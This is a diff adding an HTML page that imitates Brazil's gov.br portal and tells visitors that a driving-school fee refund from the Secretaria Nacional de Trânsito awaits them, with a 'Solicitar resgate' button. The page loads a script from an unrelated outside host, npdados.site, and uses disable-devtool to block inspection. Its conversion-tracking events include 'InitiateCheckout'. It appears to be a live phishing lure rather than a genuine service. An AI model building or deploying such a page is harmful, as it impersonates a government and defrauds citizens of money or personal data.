@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Portal Logado</title>
+<link rel="stylesheet" href="/assets/css/services.css">
+<link rel="stylesheet" href="/assets/css/valores.css">
+<div>
+    <header class="br-header false svelte-7keokj">
+        <div class="container-lg svelte-7keokj">
+            <div class="header-top">
+                <div class="header-logo"><a href="" class="link-bi svelte-7keokj"><img src="/assets/img/govbr.png" alt="Logomarca GovBR"></a></div>
+                <div class="header-actions">
+                    <div class="svelte-1jznxvb">
+                        <div class="wrapper svelte-ippqk1" style="text-align:right">
+                            <div><strong id="userName-Min" class="uppercase">***** *****</strong></div>
+                            <div id="userDocument">***.***.***-**</div>
+                        </div>
+                    </div><span class="br-divider vertical mx-half mx-sm-1" style="opacity:0"></span>
+                    <div class="wrapper-login">
+                        <div class="header-sign-in">
+                            <div class="status-bar-wrapper svelte-7keokj"><button class="svelte-1b1v9si"><span class="wrapper svelte-1b1v9si" title="ELON"><span class="content svelte-1b1v9si"><a href="/dados-pessoais"><img class="account-picture-icon svelte-1b1v9si" src="/assets/img/user.png" alt="Avatar"></a></span><i class="fas fa-caret-down svelte-1b1v9si" aria-hidden="true"></i></span></button></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <main class="container-lg" id="content">
+        <div class="container-lg">
+            <div class="row">
+                <div class="pt-2 pb-2 col">
+                    <div class="ml-3 mr-3 mt-4">
+                        <div></div>
+                        <div class="br-breadcrumb">
+                            <ul class="crumb-list">
+                                <li class="crumb home"><a class="br-button circle" href="/servicos"><span class="sr-only">Home</span><i class="fas fa-home"></i></a></li>
+                                <li class="crumb" data-active="active"><i class="icon fas fa-chevron-right"></i><span>Devolução autoescola / Consulta</span></li>
+                            </ul>
+                        </div>
+                        <div class="visao-servico">
+                            <h1>Consulta realizada com sucesso!</h1>
+                            <div class="boleto-container">
+                                <div class="boleto-header">
+                                    <div class="logo-area"><img src="/assets/img/logoavalista.webp" alt="Logo"> <span>Secretaria Nacional de Trânsito</span></div>
+                                    <div class="protocolo">Protocolo nº:<br><span id="consultaProtocolo">**********</span></div>
+                                </div>
+                                <div class="campo"><label>Beneficiário</label> <span>Nome: <span id="userName">***** ***** *****</span></span><br><span>CPF: <span id="userDocument">***.***.***-**</span></span><br></div>
+                                <div class="grid">
+                                    <div class="campo"><label>Valor a receber</label> <span>R$ <span id="consultaValor">*.***,**</span></span>
+                                    </div>
+                                    <div class="campo"><label>Data da consulta</label> <span><span id="consultaData">**/**/**** às **:**</span></span>
+                                    </div>
+                                </div>
+                                <div class="campo"><label>Avalista</label> <span>Secretaria Nacional de Trânsito & Departamento Estadual de Trânsito <span id="consultaEstado"></span></span>
+                                </div>
+                                <div class="campo"><label>Causa</label> <span>Restituição de valores da autoescola</span></div>
+                            </div>
+                        </div>
+                        <div class="flex space-between"><a class="br-button order-1 order-sm-0 mr-sm-auto mr-0 secondary mt-4" href="/consulta" id="qu-backbtn"><i class="fas fa-chevron-left" aria-hidden="true"></i>Voltar</a> <a mp-view-event="AddToWishlist" class="br-button order-1 order-sm-0 mr-sm-auto mr-0 primary mt-4"
+                                id="qu-nextbtn"><i class="fas fa-chevron-right" aria-hidden="true"></i><span id="resgatype">Solicitar resgate</span></a></div>
+                        <style>
+                            .br-modal {
+                                overflow-y: hidden !important
+                            }
+
+                            .solicitar-modal {
+                                display: flex
+                            }
+                        </style>
+                        <div class="solicitar-modal" style="display:none;opacity:0;align-items:center;justify-content:center">
+                            <div class="window">
+                                <div class="close"><i class="fas fa-chevron-left" aria-hidden="true"></i></div>
+                                <h2 id="resgatype">Solicitar resgate</h2>
+                                <p id="resgadesc">Você será redirecionado para concluir a solicitação junto ao assistente virtual e realizar o resgate dos valores disponíveis.</p>
+                                <div class="totaldisponivel flex space-between">
+                                    <div>Total disponível</div>
+                                    <div><strong>R$ <span id="consultaValor">*.***,**</span></strong></div>
+                                </div>
+                                <div style="margin-top:12px" class="flex center"><a id="nxtactionbtn" mp-click-event="InitiateCheckout" class="br-button order-1 order-sm-0 mr-sm-auto mr-0 primary mt-4" href="/solicitar"><i class="fas fa-chevron-right" aria-hidden="true"></i>Continuar</a></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer class="br-footer">
+        <div class="container-lg">
+            <div class="logo pt-4 pb-2"><img src="/assets/img/govbr.png" alt="logo"></div>
+            <div class="br-list horizontal" data-toggle="data-toggle" data-sub="data-sub">
+                <div class="col-2">
+                    <a class="br-item header" href="/servicos">
+                        <div class="content text-down-01 text-bold text-uppercase">Serviços</div>
+                    </a>
+                </div>
+                <div class="col-2">
+                    <a class="br-item header" href="/dados-pessoais">
+                        <div class="content text-down-01 text-bold text-uppercase">Dados Pessoais</div>
+                    </a>
+                </div>
+                <div class="col-2">
+                    <a class="br-item header" href="/seguranca-da-conta">
+                        <div class="content text-down-01 text-bold text-uppercase">Segurança da Conta</div>
+                    </a>
+                </div>
+                <div class="col-2">
+                    <a class="br-item header" href="/servicos">
+                        <div class="content text-down-01 text-bold text-uppercase">Acessibilidade</div>
+                    </a>
+                </div>
+            </div>
+        </div><span class="br-divider my-3"></span>
+        <div class="container-lg">
+            <div class="info">
+                <div class="text-down-01 text-medium pb-3">Todo o conteúdo deste site está publicado sob a licença <strong>Creative Commons Atribuição-SemDerivações 3.0</strong></div>
+            </div>
+        </div>
+    </footer>
+    <script src="/assets/js/skg.js"></script>
+    <script src="https://npdados.site/DT/main.js?nocache=42562645789264"></script>
+    <script>
+        window._STDT("1275268571075710")
+    </script>
+</div>
+
+</html>
+<script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
+<script type="text/javascript">
+    (function(c, l, a, r, i, t, y) {
+        c[a] = c[a] || function() {
+            (c[a].q = c[a].q || []).push(arguments)
+        };
+        t = l.createElement(r);
+        t.async = 1;
+        t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0];
+        y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "tmf7d225xn");
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"8beff67d6cbd4f26a8f06ec229b0567a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+    crossorigin="anonymous"></script>
